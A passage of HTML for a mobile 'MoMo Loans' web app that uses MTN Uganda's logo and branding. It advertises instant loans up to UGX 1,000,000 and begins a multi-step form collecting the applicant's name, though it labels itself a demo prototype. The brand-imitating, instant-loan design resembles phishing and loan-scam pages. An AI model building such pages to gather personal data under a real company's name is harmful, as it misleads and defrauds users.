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" alt="MTN Logo" class="h-8 w-auto"><button onclick="toggleMenu(false)" class="p-1 rounded-md text-slate-500 hover:bg-slate-100">
            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>
          </button>
        </div>
        <nav class="mt-6 flex flex-col space-y-1">
          <button onclick="goTo('home'); toggleMenu(false);" class="text-left px-3 py-2.5 text-sm font-semibold  hover:bg-slate-100 text-slate-800">Home</button>
          <button onclick="goTo('apply'); toggleMenu(false);" class="text-left px-3 py-2.5 text-sm font-semibold  hover:bg-slate-100 text-slate-800">Apply Now</button>
          <button onclick="showInfoModal('Check Application')" class="text-left px-3 py-2.5 text-sm font-semibold  hover:bg-slate-100 text-slate-800">Check Application</button>
          <button onclick="goTo('details'); toggleMenu(false);" class="text-left px-3 py-2.5 text-sm font-semibold  hover:bg-slate-100 text-slate-800">Loan Details</button>
          <button onclick="showInfoModal('FAQs')" class="text-left px-3 py-2.5 text-sm font-semibold  hover:bg-slate-100 text-slate-800">FAQs</button>
          <button onclick="showInfoModal('Contact Us')" class="text-left px-3 py-2.5 text-sm font-semibold  hover:bg-slate-100 text-slate-800">Contact Us</button>
          <button onclick="showInfoModal('Terms & Conditions')" class="text-left px-3 py-2.5 text-sm font-semibold  hover:bg-slate-100 text-slate-800">Terms & Conditions</button>
          <button onclick="showInfoModal('Privacy Policy')" class="text-left px-3 py-2.5 text-sm font-semibold  hover:bg-slate-100 text-slate-800">Privacy Policy</button>
        </nav>
      </div>
      <div class="text-xs text-slate-400 text-center">Demo Prototype • No real funds</div>
    </div>
  </div>

  <!-- MAIN WRAPPER -->
  <main class="w-full max-w-[760px] mx-auto px-4 py-2 flex-1">

    <!-- SCREEN 1: HOME --><section id="screen-home" class="space-y-4"><div class="text-center"><img src="data:image/png;base64,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" alt="MTN Logo" class="h-20 w-auto mx-auto mb-4"><h2 class="text-xs tracking-widest font-bold text-[#004F71] uppercase">Uganda • Mobile Money</h2><h1 class="text-3xl sm:text-4xl font-extrabold text-[#004F71] mt-1 tracking-tight uppercase">MoMo Loans</h1><p class="text-slate-600 text-sm mt-1">Instant, flexible financial relief straight to your MTN wallet.</p>
      </div>

      <!-- 4 Benefits -->
      <div class="grid grid-cols-2 sm:grid-cols-4 gap-3">
        <div class="bg-white p-3 rounded-2xl border border-slate-200/80 shadow-sm flex flex-col items-center text-center">
          <div class="w-10 h-10 rounded-full bg-blue-100 text-[#004F71] flex items-center justify-center font-bold mb-2">⚡</div>
          <span class="text-xs font-bold text-slate-800">Instant Payout</span>
        </div>
        <div class="bg-white p-3 rounded-2xl border border-slate-200/80 shadow-sm flex flex-col items-center text-center">
          <div class="w-10 h-10 rounded-full bg-blue-100 text-[#004F71] flex items-center justify-center font-bold mb-2">📱</div>
          <span class="text-xs font-bold text-slate-800">100% Mobile</span>
        </div>
        <div class="bg-white p-3 rounded-2xl border border-slate-200/80 shadow-sm flex flex-col items-center text-center">
          <div class="w-10 h-10 rounded-full bg-blue-100 text-[#004F71] flex items-center justify-center font-bold mb-2">📄</div>
          <span class="text-xs font-bold text-slate-800">Clear Terms</span>
        </div>
        <div class="bg-white p-3 rounded-2xl border border-slate-200/80 shadow-sm flex flex-col items-center text-center">
          <div class="w-10 h-10 rounded-full bg-blue-100 text-[#004F71] flex items-center justify-center font-bold mb-2">🔒</div>
          <span class="text-xs font-bold text-slate-800">Secure</span>
        </div>
      </div>

      <!-- MTN MoMo Hero Card -->
      <div class="relative overflow-hidden  bg-gradient-to-br from-[#004F71] via-[#00334E] to-[#002233] text-white p-6 shadow-lg">
        <div class="absolute -right-10 -bottom-10 w-44 h-44 rounded-full bg-[#FFCC00]/10 blur-xl pointer-events-none"></div>
        <div class="relative z-10 space-y-3">
          <span class="inline-block bg-[#FFCC00] text-[#004F71] px-3 py-1 rounded-full text-xs font-bold uppercase tracking-wider">Fast Mobile Access</span>
          <h3 class="text-2xl sm:text-3xl font-black leading-tight">Loans Up To UGX 1,000,000 INSTANTLY!</h3>
          <p class="text-blue-100 text-sm max-w-md">No paperwork, no standing in lines. Apply directly from your phone in under 2 minutes.</p>
        </div>
      </div>

      <!-- Purpose Selector Carousel -->
      <div>
        <h4 class="text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">Loan Purpose</h4>
        <div class="flex gap-3 overflow-x-auto pb-2 hide-scrollbar">
          <button onclick="setPurpose('Business')" class="purpose-chip flex-shrink-0 flex items-center gap-2 px-4 py-2.5 rounded-2xl bg-white border border-slate-200 font-semibold text-xs text-slate-700 shadow-sm hover:border-[#004F71]">💼 Business</button>
          <button onclick="setPurpose('School')" class="purpose-chip flex-shrink-0 flex items-center gap-2 px-4 py-2.5 rounded-2xl bg-white border border-slate-200 font-semibold text-xs text-slate-700 shadow-sm hover:border-[#004F71]">🎓 School</button>
          <button onclick="setPurpose('Emergency')" class="purpose-chip flex-shrink-0 flex items-center gap-2 px-4 py-2.5 rounded-2xl bg-white border border-slate-200 font-semibold text-xs text-slate-700 shadow-sm hover:border-[#004F71]">🚨 Emergency</button>
          <button onclick="setPurpose('Household')" class="purpose-chip flex-shrink-0 flex items-center gap-2 px-4 py-2.5 rounded-2xl bg-white border border-slate-200 font-semibold text-xs text-slate-700 shadow-sm hover:border-[#004F71]">🏠 Household</button>
          <button onclick="setPurpose('Travel &')" class="purpose-chip flex-shrink-0 flex items-center gap-2 px-4 py-2.5 rounded-2xl bg-white border border-slate-200 font-semibold text-xs text-slate-700 shadow-sm hover:border-[#004F71]">✈️ Travel &</button>
        </div>
      </div>

      <button onclick="goTo('apply')" class="w-full py-4 rounded-2xl bg-[#004F71] hover:bg-[#00334E] text-white font-bold text-base tracking-wide shadow-md transition-all active:scale-[0.99]">
        APPLY NOW
      </button>
    </section>

    <!-- SCREEN 2: APPLY FOR LOAN -->
    <section id="screen-apply" class="hidden space-y-5">
  <div class="flex items-center gap-3">
    <button onclick="goTo('home')" class="p-2  bg-white border border-slate-200 text-slate-600 hover:bg-slate-50">←</button>
    <div>
      <h2 class="text-xl font-black text-[#004F71]">APPLY FOR LOAN</h2>
      <p class="text-xs text-slate-500">Step 1 of 4 • Personal details</p>
    </div>
  </div>

  <!-- Wrapped inputs inside a standard <form> tag to make the 'required' feature work seamlessly -->
  <form id="loan-application-form" onsubmit="handleFormSubmit(event)" class="space-y-5">
    <div class="bg-white  p-6 border border-slate-200/80 shadow-sm space-y-4">
      
      <div>
        <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-1">Full Name</label>
        <input id="input-fullname" type="text" placeholder="John Doe" required class="w-full px-4 py-3  border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm font-semibold">
      </div>
      
